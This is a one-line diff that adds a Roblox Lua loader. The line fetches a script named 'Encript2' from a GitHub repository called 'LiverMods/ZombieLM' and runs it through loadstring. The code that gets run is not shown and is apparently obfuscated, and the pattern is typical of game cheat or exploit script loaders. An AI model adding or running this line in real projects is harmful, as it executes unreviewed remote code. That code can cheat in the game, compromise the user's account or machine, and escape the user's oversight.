@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LiverMods/ZombieLM/main/Encript2", true))()
